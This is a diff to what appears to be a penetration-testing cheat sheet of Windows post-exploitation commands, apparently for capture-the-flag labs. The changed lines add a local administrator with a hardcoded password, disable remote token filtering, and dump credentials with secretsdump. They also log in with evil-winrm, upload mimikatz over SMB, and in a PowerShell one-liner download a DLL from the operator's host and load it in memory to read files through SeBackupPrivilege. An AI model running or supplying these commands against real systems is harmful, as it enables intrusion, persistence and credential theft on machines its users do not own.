@@ -1776,8 +1776,11 @@ Invoke-Command -ComputerName SRV01 -ScriptBlock { ipconfig /all }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { net user dbf 123qweasdF! /add; net localgroup Administrators dbf /add }
 Invoke-Command -ComputerName SRV01 -ScriptBlock { reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f }
 impacket-secretsdump 'dbf':'123qweasdF!'@$TARGET
-Invoke-Command -ComputerName SRV01 -ScriptBlock { New-Item -Path "C:\Tools" -ItemType Directory }
-Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name Tools -Path C:\Tools -FullAccess dbf }
+evil-winrm-py -i $TARGET -u 'dbf' -p '123qweasdF!' --spn-prefix cifs
+Invoke-Command -ComputerName SRV01 -ScriptBlock { New-SmbShare -Name ProgramData -Path "C:\ProgramData" -FullAccess dbf }
+impacket-smbclient 'dbf':'123qweasdF!'@$TARGET
+use SHARE
+put /Upload/windows/mimikatz.exe
 
 +---------- SeBackupPrivilege ----------+
 $a = [System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://$MYIP:53/windows/SeBackupPrivilegeUtils.dll')); Get-ChildItem C:\Users -Recurse -File -Include user.txt,root.txt | ForEach-Object {$d=Join-Path $env:TEMP "$([guid]::NewGuid()).txt"; [bz.OneOEight.SeBackupPrivilege.SeBackupPrivilegeUtils]::CopyFile($_.FullName,$d,[ref]$true,$true)>$null; Get-Content $d; Remove-Item $d -Force}
